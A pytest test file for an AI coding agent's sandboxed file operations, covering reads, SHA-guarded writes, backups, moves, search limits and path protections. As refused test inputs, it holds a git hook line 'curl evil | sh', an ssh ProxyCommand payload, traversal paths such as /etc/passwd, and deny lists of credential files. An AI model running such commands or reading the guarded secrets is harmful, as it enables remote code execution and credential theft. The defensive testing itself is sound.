import base64
import errno
import hashlib
import json
import os
import threading
import time

import pytest

from webcoder.agent import fileops
from webcoder.agent.fileops import IS_WINDOWS, BackupStore, FileOps, Limits, Sandbox
from webcoder.common.errors import WebCoderError


def sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


@pytest.fixture
def root(tmp_path):
    project = tmp_path / "project"
    (project / "src").mkdir(parents=True)
    (project / "src" / "app.py").write_bytes(b"import os\n\ndef main():\n    return 1\n")
    (project / "README.md").write_bytes(b"# Demo\n")
    return project


@pytest.fixture
def ops(root, tmp_path):
    return FileOps(Sandbox([root]), BackupStore(tmp_path / "backups", keep_per_file=3))


def code(excinfo) -> str:
    return excinfo.value.code


# ------------------------------------------------------------------ reads
def test_read_has_line_numbers_and_full_file_sha(ops, root):
    r = ops.read_file(str(root), "src/app.py")
    assert r["sha256"] == sha((root / "src/app.py").read_bytes())
    assert r["total_lines"] == 4 and r["start_line"] == 1 and r["end_line"] == 4
    assert r["content"].splitlines()[0] == "     1\timport os"
    assert r["next_offset"] is None and r["eol"] == "lf"


def test_read_offset_limit_reports_continuation(ops, root):
    (root / "long.txt").write_text("\n".join(f"line {n}" for n in range(1, 101)) + "\n", encoding="utf-8")
    r = ops.read_file(str(root), "long.txt", offset=10, limit=5)
    assert (r["start_line"], r["end_line"], r["next_offset"]) == (10, 14, 15)
    assert r["content"].splitlines()[0].endswith("line 10")


def test_binary_file_needs_base64_and_round_trips(ops, root):
    payload = bytes(range(256))
    (root / "blob.bin").write_bytes(payload)
    with pytest.raises(WebCoderError) as err:
        ops.read_file(str(root), "blob.bin")
    assert code(err) == "BINARY_FILE"
    r = ops.read_file(str(root), "blob.bin", encoding="base64")
    assert base64.b64decode(r["data"]) == payload and r["sha256"] == sha(payload)


# ------------------------------------------------------------------ writes
def test_create_then_overwrite_requires_current_sha(ops, root):
    created = ops.write_file(str(root), "new/dir/file.txt", "hello\n")
    assert created["created"] and (root / "new/dir/file.txt").read_bytes() == b"hello\n"
    with pytest.raises(WebCoderError) as err:
        ops.write_file(str(root), "new/dir/file.txt", "again\n")
    assert code(err) == "SHA_REQUIRED" and err.value.details["current_sha256"] == created["sha256"]
    with pytest.raises(WebCoderError) as err:
        ops.write_file(str(root), "new/dir/file.txt", "again\n", expected_sha256="0" * 64)
    assert code(err) == "SHA_MISMATCH"
    result = ops.write_file(str(root), "new/dir/file.txt", "again\n", expected_sha256=created["sha256"])
    assert result["backup_id"] and (root / "new/dir/file.txt").read_bytes() == b"again\n"


def test_create_with_sha_for_missing_file_is_rejected(ops, root):
    with pytest.raises(WebCoderError) as err:
        ops.write_file(str(root), "missing.txt", "x", expected_sha256="a" * 64)
    assert code(err) == "NOT_FOUND"


def test_overwrite_keeps_crlf_and_bom(ops, root):
    original = b"\xef\xbb\xbfone\r\ntwo\r\n"
    (root / "win.txt").write_bytes(original)
    ops.write_file(str(root), "win.txt", "uno\ndos\n", expected_sha256=sha(original))
    assert (root / "win.txt").read_bytes() == b"\xef\xbb\xbfuno\r\ndos\r\n"


def test_edit_replaces_exactly_once_and_returns_diff(ops, root):
    before = (root / "src/app.py").read_bytes()
    r = ops.edit_file(str(root), "src/app.py", sha(before),
                      [{"old_string": "    return 1", "new_string": "    return 2"}])
    assert r["changed"] and "+    return 2" in r["diff"]
    assert (root / "src/app.py").read_bytes() == before.replace(b"return 1", b"return 2")


def test_edit_errors_are_atomic(ops, root):
    (root / "dup.txt").write_bytes(b"a\na\nb\n")
    current = sha(b"a\na\nb\n")
    with pytest.raises(WebCoderError) as err:
        ops.edit_file(str(root), "dup.txt", current, [{"old_string": "a", "new_string": "x"}])
    assert code(err) == "EDIT_AMBIGUOUS" and err.value.details["matches"] == 2
    with pytest.raises(WebCoderError) as err:
        ops.edit_file(str(root), "dup.txt", current, [{"old_string": "b", "new_string": "c"},
                                                      {"old_string": "zzz", "new_string": "y"}])
    assert code(err) == "EDIT_NOT_FOUND"
    assert (root / "dup.txt").read_bytes() == b"a\na\nb\n"  # first edit was not applied
    r = ops.edit_file(str(root), "dup.txt", current, [{"old_string": "a", "new_string": "x", "replace_all": True}])
    assert r["replacements"] == 2 and (root / "dup.txt").read_bytes() == b"x\nx\nb\n"


def test_edit_crlf_file_with_lf_old_string(ops, root):
    data = b"first\r\nsecond\r\nthird\r\n"
    (root / "crlf.txt").write_bytes(data)
    ops.edit_file(str(root), "crlf.txt", sha(data), [{"old_string": "first\nsecond", "new_string": "1st\n2nd"}])
    assert (root / "crlf.txt").read_bytes() == b"1st\r\n2nd\r\nthird\r\n"


def test_delete_keeps_backup_and_restore_brings_it_back(ops, root):
    data = (root / "README.md").read_bytes()
    deleted = ops.delete_path(str(root), "README.md", expected_sha256=sha(data))
    assert not (root / "README.md").exists()
    listing = ops.list_backups(str(root), "README.md")["backups"]
    assert listing[0]["id"] == deleted["backup_id"] and listing[0]["reason"] == "delete"
    restored = ops.restore_backup(str(root), deleted["backup_id"])
    assert (root / "README.md").read_bytes() == data and restored["sha256"] == sha(data)


def test_backups_are_pruned_per_file(ops, root):
    current = (root / "README.md").read_bytes()
    for n in range(5):
        new = f"v{n}\n".encode()
        ops.write_file(str(root), "README.md", new.decode(), expected_sha256=sha(current))
        current = new
    assert len(ops.list_backups(str(root), "README.md")["backups"]) == 3
    oldest = ops.list_backups(str(root), "README.md")["backups"][-1]  # full: saving the current one makes room
    restored = ops.restore_backup(str(root), oldest["id"], expected_sha256=sha(current))
    assert restored["sha256"] == oldest["sha256"] and sha((root / "README.md").read_bytes()) == oldest["sha256"]


def test_delete_folder_only_when_empty(ops, root):
    with pytest.raises(WebCoderError) as err:
        ops.delete_path(str(root), "src")
    assert code(err) == "DIRECTORY_NOT_EMPTY"
    (root / "empty").mkdir()
    assert ops.delete_path(str(root), "empty")["deleted"] == "directory"


def test_move_never_overwrites_and_needs_sha(ops, root):
    data = (root / "README.md").read_bytes()
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "README.md", "src/app.py", expected_sha256=sha(data))
    assert code(err) == "DESTINATION_EXISTS"
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "README.md", "docs/README.md")
    assert code(err) == "SHA_REQUIRED"
    ops.move_path(str(root), "README.md", "docs/README.md", expected_sha256=sha(data))
    assert (root / "docs/README.md").read_bytes() == data
    ops.move_path(str(root), "src", "lib")
    assert (root / "lib/app.py").exists()


def test_case_only_rename(ops, root):
    data = (root / "README.md").read_bytes()
    case_counts = not (root / "readme.md").exists()
    # What macOS gives: its realpath keeps the case as typed, so only the file itself tells them apart.
    typed = str(root / "readme.md")
    assert fileops._renames_itself(os.path.realpath(root / "README.md"), typed, typed) is not case_counts
    ops.move_path(str(root), "README.md", "readme.md", expected_sha256=sha(data))
    assert "readme.md" in os.listdir(root) and "README.md" not in os.listdir(root)
    # Judged by the file itself, not by os.path.normcase (which folds case on Windows only, not on macOS).
    real = os.path.realpath(root / "readme.md")
    assert fileops._renames_itself(real, real, real)
    assert not fileops._renames_itself(real, os.path.realpath(root / "src" / "app.py"), str(root / "src" / "app.py"))
    try:
        os.link(root / "readme.md", root / "other.md")  # the same file under another name: a different entry
    except OSError:
        pytest.skip("no hard links here")
    assert not fileops._renames_itself(real, os.path.realpath(root / "other.md"), str(root / "other.md"))
    if case_counts:  # where case counts, README.md can be a second name of that file: not the entry itself
        os.link(root / "readme.md", root / "README.md")
        with pytest.raises(WebCoderError) as err:
            ops.move_path(str(root), "readme.md", "README.md")
        assert code(err) == "DESTINATION_EXISTS" and {"readme.md", "README.md"} <= set(os.listdir(root))


def test_backups_record_the_file_mode(ops, root, tmp_path):
    first = ops.read_file(str(root), "README.md")["sha256"]
    backup_id = ops.write_file(str(root), "README.md", "# changed\n", expected_sha256=first)["backup_id"]
    meta = json.loads((tmp_path / "backups" / f"{backup_id}.json").read_text(encoding="utf-8"))
    assert isinstance(meta["mode"], int)


@pytest.mark.skipif(IS_WINDOWS, reason="POSIX permission bits (Windows inherits the profile's private ACL)")
def test_backups_are_private_and_restores_keep_the_mode(root, tmp_path):
    secret = root / "notes.txt"
    secret.write_text("private\n", encoding="utf-8")
    os.chmod(secret, 0o600)
    old_umask = os.umask(0o022)
    try:
        ops = FileOps(Sandbox([root]), BackupStore(tmp_path / "backups"))
        sha_now = ops.read_file(str(root), "notes.txt")["sha256"]
        backup_id = ops.delete_path(str(root), "notes.txt", expected_sha256=sha_now)["backup_id"]
        assert os.stat(tmp_path / "backups").st_mode & 0o077 == 0
        for suffix in (".bin", ".json"):
            assert os.stat(tmp_path / "backups" / f"{backup_id}{suffix}").st_mode & 0o077 == 0
        ops.restore_backup(str(root), backup_id)
        assert os.stat(secret).st_mode & 0o777 == 0o600  # not widened to the umask default
    finally:
        os.umask(old_umask)


def test_folder_renames_cannot_lift_protection(root, tmp_path):
    (root / ".aws").mkdir()
    (root / ".aws" / "credentials").write_text("aws_secret_access_key=XYZ", encoding="utf-8")
    (root / "home" / ".aws").mkdir(parents=True)
    (root / "home" / ".aws" / "credentials").write_text("x", encoding="utf-8")
    agent_home = root / "tools" / ".webcoder-agent"
    agent_home.mkdir(parents=True)
    ops = FileOps(Sandbox([root], protected_dirs=[agent_home]), BackupStore(tmp_path / "backups"))
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), ".aws", "public")  # would make public/credentials readable
    assert code(err) == "PATH_DENIED" and (root / ".aws" / "credentials").exists()
    ops.move_path(str(root), "home", "home2")  # still ".../.aws/credentials" afterwards: fine
    with pytest.raises(WebCoderError) as err:
        ops.read_file(str(root), "home2/.aws/credentials")
    assert code(err) == "PATH_DENIED"
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "tools", "elsewhere")  # would carry the agent's data out of its protection
    assert code(err) == "PATH_DENIED" and agent_home.exists()
    ops.write_file(str(root), "staging/config", "Host *\n  ProxyCommand calc.exe\n")  # an ordinary file here
    with pytest.raises(WebCoderError) as err:  # renamed to .ssh, it would be ~/.ssh/config, which ssh loads
        ops.move_path(str(root), "staging", ".ssh")
    assert code(err) == "PATH_DENIED" and not (root / ".ssh").exists()


def test_move_never_replaces_a_symlink_to_the_source(ops, root):
    try:
        os.symlink(root / "README.md", root / "link.md")
    except (OSError, NotImplementedError):
        pytest.skip("creating symlinks needs extra privileges on this system")
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "README.md", "link.md")
    assert code(err) == "DESTINATION_EXISTS"
    assert os.path.islink(root / "link.md") and (root / "README.md").exists()


# ------------------------------------------------------------------ listing + search
def test_list_dir_depth_ignored_and_blocked(ops, root):
    (root / "node_modules" / "pkg").mkdir(parents=True)
    (root / ".env").write_text("SECRET=1")
    r = ops.list_dir(str(root), ".", depth=2)
    by_path = {entry["path"]: entry for entry in r["entries"]}
    assert "src/app.py" in by_path and by_path["node_modules"].get("ignored")
    assert "node_modules/pkg" not in by_path
    assert by_path[".env"].get("blocked")


def test_a_huge_folder_is_listed_only_up_to_the_scan_cap(root, tmp_path):
    (root / "many").mkdir()
    for n in range(30):
        (root / "many" / f"f{n:02}.txt").write_bytes(b"")
    ops = FileOps(Sandbox([root]), BackupStore(tmp_path / "b"), Limits(list_scan_cap=10))
    listed = ops.list_dir(str(root), "many")
    assert listed["scan_capped"] and listed["total"] == 10


def test_finding_and_searching_read_no_more_than_their_budget(root, tmp_path, monkeypatch):
    """A folder is read (and sorted) only up to what the walk may still read, not whole and then counted."""
    (root / "many").mkdir()
    for n in range(40):
        (root / "many" / f"f{n:02}.txt").write_bytes(b"nothing here\n")
    budget = fileops._Budget(10)
    walked = list(fileops._walk(str(root / "many"), budget))
    assert len(walked) == 1 and len(walked[0][2]) == 10 and budget.cut and budget.left == 0
    monkeypatch.setattr(fileops, "SCAN_ENTRIES", 25)
    ops = FileOps(Sandbox([root]), BackupStore(tmp_path / "b"))
    found = ops.find_files(str(root), "*.none")
    assert found["truncated"] == "scan_cap" and found["scanned"] <= 25
    searched = ops.search(str(root), "needle")
    assert searched["truncated"] == "scan_cap" and searched["files_scanned"] <= 25
    moving = FileOps(Sandbox([root]), BackupStore(tmp_path / "c"), Limits(list_scan_cap=10))
    with pytest.raises(WebCoderError) as err:
        moving.move_path(str(root), "many", "elsewhere")
    assert code(err) == "FOLDER_TOO_LARGE" and (root / "many").is_dir()


def test_path_locks_are_dropped_when_nobody_needs_them(ops, root):
    """A long-running agent touches ever new paths: their locks do not pile up."""
    for n in range(5):
        ops.write_file(str(root), f"shots/s{n}.txt", "x")
    assert ops._locks._locks == {}
    locks, started, inside = fileops.PathLocks(), threading.Event(), []

    def second():
        started.set()
        with locks.hold("a", "b"):
            inside.append("second")
    with locks.hold("b"):
        worker = threading.Thread(target=second)
        worker.start()
        started.wait(5)
        time.sleep(0.1)
        assert inside == [] and set(locks._locks) == {os.path.normcase("a"), os.path.normcase("b")}
    worker.join(5)
    assert inside == ["second"] and locks._locks == {}


def test_search_literal_regex_glob_and_context(ops, root):
    (root / "notes.md").write_text("TODO: write docs\n", encoding="utf-8")
    r = ops.search(str(root), "todo")
    assert [m["path"] for m in r["matches"]] == ["notes.md"]
    r = ops.search(str(root), r"def \w+\(", regex=True, glob="*.py", context=1)
    assert r["matches"][0]["path"] == "src/app.py" and r["matches"][0]["line"] == 3
    assert r["matches"][0]["before"] == [[2, ""]]
    assert ops.search(str(root), "todo", case_sensitive=True)["matches"] == []


def test_pathological_regex_is_stopped_instead_of_hanging_the_agent(root, tmp_path):
    (root / "long.txt").write_text("a" * 60 + "b\n", encoding="utf-8")  # stdlib re would need hours here
    ops = FileOps(Sandbox([root]), BackupStore(tmp_path / "backups"),
                  Limits(search_seconds=5, regex_line_seconds=0.3))
    started = time.monotonic()
    r = ops.search(str(root), "(a|aa)+$", regex=True, glob="long.txt")
    assert r["truncated"] == "regex_timeout" and time.monotonic() - started < 3


def test_find_files_by_name_and_path(ops, root):
    (root / "src" / "deep").mkdir()
    (root / "src" / "deep" / "Test_util.py").write_text("x", encoding="utf-8")
    (root / "node_modules" / "pkg").mkdir(parents=True)
    (root / "node_modules" / "pkg" / "index.py").write_text("x", encoding="utf-8")
    (root / ".env").write_text("SECRET=1", encoding="utf-8")
    paths = lambda r: [item["path"] for item in r["matches"]]  # noqa: E731
    assert paths(ops.find_files(str(root), "*.py")) == ["src/app.py", "src/deep/Test_util.py"]
    assert paths(ops.find_files(str(root), "test_*")) == ["src/deep/Test_util.py"]  # case-insensitive names
    assert paths(ops.find_files(str(root), "src/**/*.py")) == ["src/app.py", "src/deep/Test_util.py"]
    assert paths(ops.find_files(str(root), "readme*,*.env")) == [".env", "README.md"]
    assert ops.find_files(str(root), ".env")["matches"][0]["blocked"] is True
    assert paths(ops.find_files(str(root), "deep")) == ["src/deep"]  # folders too
    assert "node_modules/pkg/index.py" in paths(ops.find_files(str(root), "*.py", include_ignored=True))
    limited = ops.find_files(str(root), "*", max_results=2)
    assert len(limited["matches"]) == 2 and limited["truncated"] == "max_results"
    assert paths(ops.find_files(str(root), "*.py", path="src/deep")) == ["src/deep/Test_util.py"]
    assert paths(ops.find_files(str(root), "src/**")) == ["src/deep", "src/app.py", "src/deep/Test_util.py"]
    assert paths(ops.find_files(str(root), "**/deep/*.py,src/[a]pp.*")) == ["src/app.py", "src/deep/Test_util.py"]


def test_path_globs_cannot_hold_the_agent(ops, root):
    """Matched part by part: many **/ over a deep tree take no time (as one regular expression, minutes)."""
    deep = root.joinpath(*[f"d{n}" for n in range(30)])
    deep.mkdir(parents=True)
    (deep / "file.txt").write_bytes(b"x")
    started = time.monotonic()
    assert ops.find_files(str(root), "**/" * 12 + "missing.txt")["matches"] == []
    assert ops.find_files(str(root), "**/d1/" * 10 + "missing.txt")["matches"] == []
    assert time.monotonic() - started < 5
    found = ops.find_files(str(root), "**/d29/**/*.txt")["matches"]
    assert [item["path"] for item in found] == ["/".join(f"d{n}" for n in range(30)) + "/file.txt"]


def test_large_files_can_be_moved_deleted_and_restored(root, tmp_path):
    """Bigger than the in-memory limits: hashed and backed up as streams."""
    from webcoder.agent.fileops import Limits
    ops = FileOps(Sandbox([root]), BackupStore(tmp_path / "backups", max_total_bytes=50_000),
                  Limits(max_write_bytes=1000, max_transfer_bytes=1000, max_text_bytes=1000))
    big = os.urandom(20_000)
    (root / "big.bin").write_bytes(big)
    digest = ops.stat(str(root), "big.bin")["sha256"]
    ops.move_path(str(root), "big.bin", "moved.bin", expected_sha256=digest)
    backup_id = ops.delete_path(str(root), "moved.bin", expected_sha256=digest)["backup_id"]
    assert not (root / "moved.bin").exists()
    ops.restore_backup(str(root), backup_id)
    assert (root / "moved.bin").read_bytes() == big
    (root / "huge.bin").write_bytes(os.urandom(60_000))  # more than the backup store can keep
    with pytest.raises(WebCoderError) as err:
        ops.delete_path(str(root), "huge.bin", expected_sha256=ops.stat(str(root), "huge.bin")["sha256"])
    assert code(err) == "FILE_TOO_LARGE" and (root / "huge.bin").exists()


# ------------------------------------------------------------------ boundaries
def test_agent_folder_is_off_limits_even_for_reads(root, tmp_path):
    home = root / ".webcoder-agent"  # e.g. the user opened their whole home folder
    home.mkdir()
    (home / "config.json").write_text('{"device_secret": "s3cret"}', encoding="utf-8")
    ops = FileOps(Sandbox([root], protected_dirs=[home]), BackupStore(tmp_path / "backups"))
    with pytest.raises(WebCoderError) as err:
        ops.read_file(str(root), ".webcoder-agent/config.json")
    assert code(err) == "PATH_DENIED"
    assert ops.search(str(root), "device_secret")["matches"] == []
    listing = {entry["path"]: entry for entry in ops.list_dir(str(root), ".", depth=3)["entries"]}
    assert listing[".webcoder-agent"].get("blocked") and ".webcoder-agent/config.json" not in listing
    with pytest.raises(WebCoderError) as err:
        ops.check_root(str(home))  # nor as a project of its own
    assert code(err) == "ROOT_NOT_ALLOWED"


def test_search_and_listing_do_not_follow_links_out_of_the_project(ops, root, tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("needle outside\n", encoding="utf-8")
    try:
        if IS_WINDOWS:  # a junction needs no special privileges, and os.walk descends into it
            import _winapi
            _winapi.CreateJunction(str(outside), str(root / "linked"))
        else:
            os.symlink(outside, root / "linked", target_is_directory=True)
    except (OSError, NotImplementedError, AttributeError):
        pytest.skip("cannot create a directory link here")
    assert ops.search(str(root), "needle")["matches"] == []
    listing = {entry["path"] for entry in ops.list_dir(str(root), ".", depth=2)["entries"]}
    assert "linked/secret.txt" not in listing
    assert ops.find_files(str(root), "secret*")["matches"] == []


def test_links_inside_the_project_do_not_unlock_denied_files(ops, root):
    (root / ".ssh").mkdir()
    (root / ".ssh" / "config").write_text("Host secret-box\n", encoding="utf-8")
    try:
        if IS_WINDOWS:
            import _winapi
            _winapi.CreateJunction(str(root / ".ssh"), str(root / "public"))
        else:
            os.symlink(root / ".ssh", root / "public", target_is_directory=True)
    except (OSError, NotImplementedError, AttributeError):
        pytest.skip("cannot create a directory link here")
    assert ops.search(str(root), "secret-box")["matches"] == []  # not as public/config either
    listing = {entry["path"]: entry for entry in ops.list_dir(str(root), ".", depth=2)["entries"]}
    assert listing["public"]["type"] == "symlink" and "public/config" not in listing
    # Starting at the link itself: the files are still judged as what they really are.
    assert ops.search(str(root), "secret-box", path="public")["matches"] == []
    assert ops.list_dir(str(root), "public")["entries"] == [
        {"path": "public/config", "type": "file", "size": (root / ".ssh" / "config").stat().st_size,
         "mtime": int((root / ".ssh" / "config").stat().st_mtime), "blocked": True}]
    with pytest.raises(WebCoderError) as err:
        ops.read_file(str(root), "public/config")
    assert code(err) == "PATH_DENIED"


def test_sample_env_files_are_exempt_from_the_env_rules_only(root, tmp_path):
    (root / ".ssh").mkdir()
    (root / ".ssh" / ".env.example").write_text("KEY=sample\n", encoding="utf-8")
    (root / ".env.example").write_text("KEY=sample\n", encoding="utf-8")
    ops = FileOps(Sandbox([root]), BackupStore(tmp_path / "backups"))
    assert "KEY=sample" in ops.read_file(str(root), ".env.example")["content"]
    with pytest.raises(WebCoderError) as err:
        ops.read_file(str(root), ".ssh/.env.example")  # still under .ssh/*
    assert code(err) == "PATH_DENIED"
    custom = FileOps(Sandbox([root], deny=[".env", ".env.*", "*.example"]), BackupStore(tmp_path / "backups2"))
    with pytest.raises(WebCoderError) as err:
        custom.read_file(str(root), ".env.example")  # the owner's own rule still applies
    assert code(err) == "PATH_DENIED"


@pytest.mark.parametrize("path", ["../outside.txt", "src/../../x", "/etc/passwd", "C:/Windows/win.ini", "a\x00b"])
def test_paths_cannot_leave_the_project(ops, root, path):
    with pytest.raises(WebCoderError) as err:
        ops.read_file(str(root), path)
    assert code(err) == "INVALID_PATH"


def test_root_must_be_inside_allowed_roots(ops, tmp_path):
    other = tmp_path / "other"
    other.mkdir()
    with pytest.raises(WebCoderError) as err:
        ops.list_dir(str(other))
    assert code(err) == "ROOT_NOT_ALLOWED"


def test_symlink_escape_is_rejected(ops, root, tmp_path):
    outside = tmp_path / "secret.txt"
    outside.write_text("top secret")
    try:
        os.symlink(outside, root / "link.txt")
    except (OSError, NotImplementedError):
        pytest.skip("creating symlinks needs extra privileges on this system")
    with pytest.raises(WebCoderError) as err:
        ops.read_file(str(root), "link.txt")
    assert code(err) == "PATH_ESCAPE"


@pytest.mark.parametrize("name", [".env", ".env.local", "id_rsa", "server.pem", ".ssh/config", "deploy/.npmrc"])
def test_secret_files_are_blocked(ops, root, name):
    target = root / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("secret")
    with pytest.raises(WebCoderError) as err:
        ops.read_file(str(root), name)
    assert code(err) == "PATH_DENIED"


def test_env_example_is_allowed(ops, root):
    (root / ".env.example").write_text("KEY=\n")
    assert ops.read_file(str(root), ".env.example")["total_lines"] == 1


def test_writes_inside_git_are_refused(ops, root):
    (root / ".git" / "hooks").mkdir(parents=True)
    with pytest.raises(WebCoderError) as err:
        ops.write_file(str(root), ".git/hooks/pre-commit", "#!/bin/sh\n")
    assert code(err) == "PATH_DENIED"


@pytest.mark.skipif(IS_WINDOWS, reason="Windows does not allow names ending with a space")
def test_spaces_around_a_name_are_part_of_it(ops, root):
    (root / " report.txt ").write_bytes(b"the spaced one\n")
    (root / "report.txt").write_bytes(b"the plain one\n")
    assert "the spaced one" in ops.read_file(str(root), " report.txt ")["content"]


def test_a_hub_on_the_same_computer_keeps_its_data(ops, root):
    """Running the hub in a project folder (`--data-dir data`) must not hand every user's accounts to a client."""
    (root / "data" / "backups").mkdir(parents=True)
    for name in ("hub.db", "hub.db-wal", "master.key", "backups/hub-20260924-010203.db"):
        (root / "data" / name).write_bytes(b"SQLite format 3\x00")
        with pytest.raises(WebCoderError) as err:
            ops.read_file(str(root), f"data/{name}")
        assert code(err) == "PATH_DENIED", name


@pytest.mark.skipif(not IS_WINDOWS, reason="Windows junctions")
def test_a_junction_is_never_taken_for_its_target(ops, root):
    """os.path.islink does not see junctions, and resolve() hands back the target: deleting or moving the junction
    must not delete or move the folder it points to."""
    import _winapi
    (root / "real").mkdir()
    _winapi.CreateJunction(str(root / "real"), str(root / "link"))
    for call in (lambda: ops.delete_path(str(root), "link"), lambda: ops.move_path(str(root), "link", "moved")):
        with pytest.raises(WebCoderError) as err:
            call()
        assert code(err) == "IS_SYMLINK"
    assert (root / "real").is_dir() and not (root / "moved").exists()
    assert ops.stat(str(root), "link")["symlink"] is True and ops.stat(str(root), "real")["symlink"] is False


def test_git_data_is_not_readable_either(ops, root):
    """.git/config can hold a token (in a remote URL, or a CI checkout's auth header), rebase state holds patches
    of secret files: only the git tools, which mask and leave out secrets, look inside."""
    (root / ".git" / "modules" / "lib").mkdir(parents=True)
    (root / ".git" / "config").write_bytes(b'[remote "origin"]\n\turl = https://me:ghp_token@github.com/me/x\n')
    (root / ".git" / "modules" / "lib" / "config").write_bytes(b"[core]\n")
    (root / "mirror.git").mkdir()
    (root / "mirror.git" / "config").write_bytes(b"[remote]\n")
    for path in (".git/config", ".GIT/config", ".git/modules/lib/config", ".git/HEAD", "mirror.git/config"):
        with pytest.raises(WebCoderError) as err:
            ops.read_file(str(root), path)
        assert code(err) == "PATH_DENIED", path
    found = ops.find_files(str(root), "config", include_ignored=True)["matches"]
    assert {item["path"]: item.get("blocked") for item in found} == {
        ".git/config": True, ".git/modules/lib/config": True, "mirror.git/config": True}
    assert ops.search(str(root), "ghp_token")["matches"] == []


@pytest.mark.skipif(not IS_WINDOWS, reason="Windows-specific names")
@pytest.mark.parametrize("path", ["CON", "nul.txt", "file.txt:stream", "trailing. "])
def test_windows_special_names_rejected(ops, root, path):
    with pytest.raises(WebCoderError) as err:
        ops.write_file(str(root), path, "x")
    assert code(err) == "INVALID_PATH"


def test_read_only_sandbox_refuses_writes(root, tmp_path):
    ops = FileOps(Sandbox([root], read_only=True), BackupStore(tmp_path / "b"))
    assert ops.read_file(str(root), "README.md")["total_lines"] == 1
    with pytest.raises(WebCoderError) as err:
        ops.make_dir(str(root), "x")
    assert code(err) == "AGENT_READ_ONLY"


def test_write_size_limit(root, tmp_path):
    ops = FileOps(Sandbox([root]), BackupStore(tmp_path / "b"), Limits(max_write_bytes=10))
    with pytest.raises(WebCoderError) as err:
        ops.write_file(str(root), "big.txt", "x" * 11)
    assert code(err) == "FILE_TOO_LARGE"


def test_protections_hold_for_projects_rooted_inside_protected_folders(tmp_path):
    """The hub picks project roots inside the owner's folders; rooting one at ~/.ssh, ~/.aws or a repo's .git
    must not dodge the deny list or the .git write protection."""
    home = tmp_path / "home"
    (home / ".ssh").mkdir(parents=True)
    (home / ".ssh" / "config").write_bytes(b"Host prod\n  IdentityFile ~/.ssh/prod\n")
    (home / ".aws").mkdir()
    (home / ".aws" / "credentials").write_bytes(b"[default]\naws_secret_access_key = x\n")
    (home / "repo" / ".git" / "hooks").mkdir(parents=True)
    ops = FileOps(Sandbox([home]), BackupStore(tmp_path / "backups"))
    for root, name in ((home / ".ssh", "config"), (home / ".aws", "credentials")):
        with pytest.raises(WebCoderError) as err:
            ops.read_file(str(root), name)
        assert code(err) == "PATH_DENIED", root
        assert ops.list_dir(str(root))["entries"][0]["blocked"]
        assert ops.find_files(str(root), "*")["matches"][0]["blocked"]
        assert ops.search(str(root), "e")["matches"] == []  # never read by search either
    with pytest.raises(WebCoderError) as err:  # no hook can be planted
        ops.write_file(str(home / "repo" / ".git"), "hooks/pre-commit", "#!/bin/sh\ncurl evil | sh\n")
    assert code(err) == "PATH_DENIED" and not (home / "repo" / ".git" / "hooks" / "pre-commit").exists()
    ops.write_file(str(home / "repo"), "README.md", "fine\n")  # ordinary files are unaffected
    (home / "repo" / ".git" / "config").write_bytes(b"[remote]\n\turl = https://me:token@example.com/x\n")
    for folder, name in ((home / ".ssh", "config"), (home / ".aws", "credentials"), (home / "repo" / ".git", "config")):
        shared = FileOps(Sandbox([folder]), BackupStore(tmp_path / "backups"))  # the owner shared the folder itself
        with pytest.raises(WebCoderError) as err:
            shared.read_file(str(folder), name)
        assert code(err) == "PATH_DENIED", folder


@pytest.fixture
def meanwhile(monkeypatch):
    """Another program creates `path` while the agent is writing its temporary copy."""
    def arrange(path):
        real = fileops.tempfile.mkstemp

        def mkstemp(*args, **kwargs):
            made = real(*args, **kwargs)
            path.write_bytes(b"theirs\n")
            return made
        monkeypatch.setattr(fileops.tempfile, "mkstemp", mkstemp)
    return arrange


def leftovers(root) -> list:
    return list(root.rglob(".webcoder-*.tmp"))


@pytest.mark.parametrize("posix", [False, True] if IS_WINDOWS else [False])
def test_new_files_never_replace_one_created_meanwhile(ops, root, meanwhile, monkeypatch, posix):
    if posix:  # the link() route, also on Windows (NTFS has hard links)
        monkeypatch.setattr(fileops, "_RENAME_REPLACES", True)
    meanwhile(root / "new.txt")
    with pytest.raises(WebCoderError) as err:  # write_file without expected_sha256 only creates
        ops.write_file(str(root), "new.txt", "ours")
    assert code(err) == "DESTINATION_EXISTS" and (root / "new.txt").read_bytes() == b"theirs\n"
    meanwhile(root / "shot.png")
    with pytest.raises(WebCoderError) as err:
        ops.create_file(str(root), "shot.png", b"ours")
    assert code(err) == "DESTINATION_EXISTS" and (root / "shot.png").read_bytes() == b"theirs\n"
    assert not leftovers(root)


def test_restoring_a_deleted_file_never_replaces_a_new_one(ops, root, meanwhile):
    deleted = ops.delete_path(str(root), "README.md", sha((root / "README.md").read_bytes()))
    meanwhile(root / "README.md")
    with pytest.raises(WebCoderError) as err:
        ops.restore_backup(str(root), deleted["backup_id"])
    assert code(err) == "DESTINATION_EXISTS" and (root / "README.md").read_bytes() == b"theirs\n"
    assert not leftovers(root)


def test_moving_a_file_never_replaces_one_created_meanwhile(ops, root, monkeypatch):
    real = fileops.os.makedirs

    def makedirs(path, *args, **kwargs):  # the last step before the move itself
        real(path, *args, **kwargs)
        (root / "docs" / "README.md").write_bytes(b"theirs\n")
    monkeypatch.setattr(fileops.os, "makedirs", makedirs)
    with pytest.raises(WebCoderError) as err:
        ops.move_path(str(root), "README.md", "docs/README.md", sha((root / "README.md").read_bytes()))
    assert code(err) == "DESTINATION_EXISTS" and (root / "docs" / "README.md").read_bytes() == b"theirs\n"
    assert (root / "README.md").read_bytes() == b"# Demo\n"


def test_deleting_never_removes_a_version_saved_meanwhile(ops, root, monkeypatch):
    real_save = ops.backups.save_file

    def save_file(t, reason):  # the old version is backed up, and then an editor saves a new one
        saved = real_save(t, reason)
        (root / "README.new").write_bytes(b"# saved by the editor meanwhile\n")
        os.replace(root / "README.new", root / "README.md")  # editors save by replacing the file
        return saved
    monkeypatch.setattr(ops.backups, "save_file", save_file)
    with pytest.raises(WebCoderError) as err:
        ops.delete_path(str(root), "README.md", sha(b"# Demo\n"))
    assert code(err) == "SHA_MISMATCH" and (root / "README.md").read_bytes() == b"# saved by the editor meanwhile\n"
    assert ops.list_backups(str(root))["backups"] == []


